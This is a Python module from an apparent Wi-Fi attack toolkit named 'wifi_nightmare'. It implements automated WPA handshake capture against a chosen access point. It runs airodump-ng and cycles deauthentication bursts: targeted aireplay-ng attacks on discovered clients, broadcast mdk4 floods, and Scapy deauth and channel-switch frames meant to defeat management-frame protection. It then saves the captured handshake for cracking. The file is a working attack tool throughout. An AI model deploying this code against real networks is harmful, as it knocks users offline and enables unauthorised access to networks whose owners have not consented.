import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import threading
from wifi_nightmare.logger import logger
from wifi_nightmare.config import HANDSHAKES_DIR, C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET
from wifi_nightmare.utils import mask_bssid, mask_bssid_filename, safe_ssid as sanitize_ssid

try:
    from wifi_nightmare.eviction import AdvancedEviction
    HAS_EVICTION = True
except Exception:
    AdvancedEviction = None
    HAS_EVICTION = False


def _find_deauth_tool():
    for tool in ("mdk4", "mdk3", "aireplay-ng"):
        if shutil.which(tool):
            return tool
    return None


def _analyze_capture(cap_file, bssid):
    """Run aircrack-ng on the capture; return (handshake_count, bssid_present, raw_stdout)."""
    try:
        proc = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=10,
            stdin=subprocess.DEVNULL
        )
        out = proc.stdout.lower()
        m = re.search(r'(\d+)\s+handshake', out)
        count = int(m.group(1)) if m else 0
        return count, bssid.lower() in out, proc.stdout
    except Exception as e:
        logger.debug(f"aircrack analyze failed: {e}")
        return 0, False, ""


def _count_eapol_frames(cap_file, bssid):
    """Diagnostic: count EAPOL-Key frames for bssid directly from the pcap."""
    try:
        from scapy.all import rdpcap, EAPOL, Dot11
        pkts = rdpcap(cap_file)
        bssid = bssid.lower()
        count = 0
        for p in pkts:
            if p.haslayer(EAPOL) and getattr(p[EAPOL], 'type', None) == 3:
                d = p[Dot11] if p.haslayer(Dot11) else None
                if d:
                    addrs = {getattr(d, 'addr1', ''), getattr(d, 'addr2', ''), getattr(d, 'addr3', '')}
                    if bssid in addrs:
                        count += 1
        return count
    except Exception:
        return -1


def _verify_handshake(cap_file, bssid):
    """Return True if the capture contains a valid WPA handshake for bssid."""
    count, bssid_found, _raw = _analyze_capture(cap_file, bssid)
    return count >= 1 and bssid_found


def _extract_clients_from_csv(csv_path, target_bssid):
    """Parse airodump-ng CSV output to find connected station MACs."""
    clients = set()
    if not os.path.exists(csv_path):
        return clients
    try:
        target = target_bssid.lower()
        with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        in_station_section = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith("Station MAC"):
                in_station_section = True
                continue
            if in_station_section:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 6:
                    sta_mac = parts[0].lower()
                    assoc_bssid = parts[5].lower()
                    if assoc_bssid == target and len(sta_mac) == 17 and sta_mac != "ff:ff:ff:ff:ff:ff":
                        clients.add(sta_mac)
    except Exception as e:
        logger.debug(f"CSV client parse error: {e}")
    return clients


def _kill_proc(proc):
    if proc is None or proc.poll() is not None:
        return
    try:
        if os.name != "nt":
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        else:
            proc.terminate()
        proc.wait(timeout=2)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown", injector_interface=None):
    if not shutil.which("airodump-ng"):
        logger.error("airodump-ng not found")
        print(f"{C_RED}[!] airodump-ng not found. Install: sudo apt install aircrack-ng{C_RESET}")
        return None

    deauth_tool = _find_deauth_tool()
    if not deauth_tool:
        if HAS_EVICTION:
            logger.warning("No external deauth tool found — falling back to Scapy-only eviction")
            print(f"{C_YELLOW}[!] mdk4/aireplay-ng not found — using Scapy eviction only (install mdk4 for better results){C_RESET}")
        else:
            logger.error("No deauth tool and no Scapy eviction available")
            print(f"{C_RED}[!] No deauth tool found. Install mdk4: sudo apt install mdk4{C_RESET}")
            return None

    tmpdir = tempfile.mkdtemp(prefix="wfn_")
    cap_prefix = os.path.join(tmpdir, "cap")
    bl_file = os.path.join(tmpdir, "bl.txt")

    inj_iface = injector_interface or interface

    # Ensure interfaces are locked to the target AP channel
    subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if inj_iface != interface:
        subprocess.run(["iw", "dev", inj_iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iwconfig", inj_iface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    eviction_engine = AdvancedEviction(inj_iface, bssid, channel, ssid) if HAS_EVICTION else None

    print(f"{C_YELLOW}[*] Capturing handshake on {interface} (ch{channel}) + deauth on {inj_iface}{C_RESET}")
    print(f"{C_CYAN}    Target AP: {mask_bssid(bssid)} ({ssid}){C_RESET}")

    airodump_proc = None
    deauth_procs = []

    try:
        # Generate both pcap and csv so active client stations are discovered in real time
        airodump_cmd = [
            "airodump-ng",
            "--write", cap_prefix,
            "--output-format", "pcap,csv",
            "--bssid", bssid,
            "--channel", str(channel),
            interface
        ]
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid if os.name != "nt" else None
        )
        logger.info(f"airodump-ng started (PID {airodump_proc.pid})")
        time.sleep(1.5)

        with open(bl_file, "w") as f:
            f.write(bssid + "\n")

        BURST_SECONDS  = 7
        SILENT_SECONDS = 5
        deauth_err_file = os.path.join(tmpdir, "deauth_err.txt")

        def _stop_all_deauth():
            nonlocal deauth_procs
            for p in deauth_procs:
                _kill_proc(p)
            deauth_procs = []

        def _start_burst():
            nonlocal deauth_procs
            _stop_all_deauth()

            csv_file = f"{cap_prefix}-01.csv"
            discovered_clients = _extract_clients_from_csv(csv_file, bssid)

            # 1. Targeted Unicast Deauth for every discovered client station
            if discovered_clients and shutil.which("aireplay-ng"):
                for client_mac in list(discovered_clients)[:5]:
                    cmd = ["aireplay-ng", "-0", "15", "-a", bssid, "-c", client_mac,
                           "--ignore-negative-one", inj_iface]
                    try:
                        p = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid if os.name != "nt" else None
                        )
                        deauth_procs.append(p)
                    except Exception as e:
                        logger.debug(f"Targeted aireplay failed for {client_mac}: {e}")

            # 2. Broadcast Deauth via mdk4 or aireplay-ng (only if available)
            if deauth_tool:
                if deauth_tool in ("mdk4", "mdk3"):
                    bcast_cmd = [deauth_tool, inj_iface, "d", "-b", bl_file, "-c", str(channel)]
                else:
                    bcast_cmd = ["aireplay-ng", "-0", "15", "-a", bssid,
                                 "--ignore-negative-one", inj_iface]

                try:
                    p_bcast = subprocess.Popen(
                        bcast_cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=open(deauth_err_file, "wb"),
                        preexec_fn=os.setsid if os.name != "nt" else None
                    )
                    deauth_procs.append(p_bcast)
                except Exception as e:
                    logger.debug(f"Broadcast deauth failed: {e}")

            # 3. Inject multi-vector Scapy frames (Bidirectional deauth + CSA beacon for PMF)
            if eviction_engine:
                def _scapy_evict():
                    try:
                        for client_mac in discovered_clients:
                            eviction_engine.send_deauth_burst(client_mac=client_mac, count=4)
                        eviction_engine.send_deauth_burst(client_mac=None, count=4)
                        eviction_engine.send_csa_burst(count=3)
                    except Exception as ex:
                        logger.debug(f"Scapy eviction thread error: {ex}")
                threading.Thread(target=_scapy_evict, daemon=True).start()

            return discovered_clients

        # ── Start first burst ─────────────────────────────────────────────────
        initial_clients = _start_burst()
        burst_start   = time.time()
        deauth_active = True
        cycle         = 1
        cap_file      = f"{cap_prefix}-01.cap"
        csv_file      = f"{cap_prefix}-01.csv"
        known_clients = set(initial_clients)

        print(f"{C_GREEN}[+] Deauth active ({deauth_tool} + multi-vector eviction on {inj_iface}){C_RESET}")
        print(f"{C_CYAN}    Cycle strategy: {BURST_SECONDS}s deauth burst → {SILENT_SECONDS}s reconnect window{C_RESET}")

        start = time.time()
        while time.time() - start < timeout:
            elapsed = int(time.time() - start)

            # Check for handshake in the pcap
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                if _verify_handshake(cap_file, bssid):
                    _stop_all_deauth()
                    print(f"\n{C_GREEN}[+] HANDSHAKE CAPTURED! ({elapsed}s, cycle {cycle}){C_RESET}")
                    safe_ssid  = sanitize_ssid(ssid)
                    final_name = f"{safe_ssid}_{mask_bssid_filename(bssid)}.pcap"
                    final_path = os.path.join(HANDSHAKES_DIR, final_name)
                    shutil.copy2(cap_file, final_path)
                    print(f"{C_GREEN}    Saved: {final_path}{C_RESET}")
                    logger.info(f"Handshake captured: {final_path}")
                    return final_path

            # Verify airodump-ng is running
            if airodump_proc.poll() is not None:
                logger.error(f"airodump-ng exited early ({airodump_proc.returncode})")
                print(f"\n{C_RED}[!] airodump-ng exited early — check interface state{C_RESET}")
                break

            # Update known clients list from CSV
            new_clients = _extract_clients_from_csv(csv_file, bssid)
            if new_clients - known_clients:
                added = new_clients - known_clients
                known_clients.update(added)
                logger.info(f"Discovered {len(added)} new client(s) on target: {added}")

            # Cycle management
            now = time.time()
            elapsed_phase = now - burst_start

            if deauth_active and elapsed_phase >= BURST_SECONDS:
                _stop_all_deauth()
                deauth_active = False
                burst_start   = now
                eapol = _count_eapol_frames(cap_file, bssid) if os.path.exists(cap_file) else 0
                eapol_str = f" | {eapol} EAPOL frames" if eapol > 0 else ""
                cli_info = f" | {len(known_clients)} client(s)" if known_clients else ""
                print(f"\n{C_YELLOW}    [Cycle {cycle}] Burst finished{eapol_str}{cli_info} — "
                      f"waiting {SILENT_SECONDS}s for reconnect...{C_RESET}")

            elif not deauth_active and elapsed_phase >= SILENT_SECONDS:
                cycle += 1
                known_clients = _start_burst()
                deauth_active = True
                burst_start   = now
                logger.info(f"Deauth burst #{cycle} started ({len(known_clients)} clients targeted)")
                print(f"\n{C_YELLOW}    [Cycle {cycle}] Sending deauth burst ({len(known_clients)} active client(s) targeted)...{C_RESET}")

            # Status line
            phase = f"Deauthing (#{cycle})" if deauth_active else f"Reconnect window (#{cycle})"
            cli_badge = f" [Clients: {len(known_clients)}]" if known_clients else " [Scanning for clients...]"
            pcap_sz = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
            pcap_note = f" | {pcap_sz/1024:.1f} KB" if pcap_sz > 1024 else f" | {pcap_sz} B"
            sys.stdout.write(f"\r\033[K{C_CYAN}    [{elapsed}s/{timeout}s] {phase}{cli_badge}{pcap_note}{C_RESET}")
            sys.stdout.flush()
            time.sleep(1)

        print(f"\n{C_RED}[-] Handshake not captured within {timeout}s{C_RESET}")
        if os.path.exists(cap_file):
            size = os.path.getsize(cap_file)
            count, bssid_found, _raw = _analyze_capture(cap_file, bssid)
            eapol = _count_eapol_frames(cap_file, bssid)
            print(f"{C_YELLOW}    Capture diagnostics:{C_RESET}")
            print(f"      pcap size       : {size} bytes")
            print(f"      EAPOL-Key frames: {eapol if eapol >= 0 else 'n/a'}")
            print(f"      Clients targeted: {len(known_clients)}")
            print(f"      aircrack-ng says: {count} handshake, target BSSID "
                  f"{'present' if bssid_found else 'not found'}")
        return None

    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[*] Capture interrupted{C_RESET}")
        return None
    except Exception as e:
        logger.error(f"Native capture error: {e}")
        print(f"{C_RED}[!] Capture error: {e}{C_RESET}")
        return None
    finally:
        for p in deauth_procs:
            _kill_proc(p)
        _kill_proc(airodump_proc)
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass
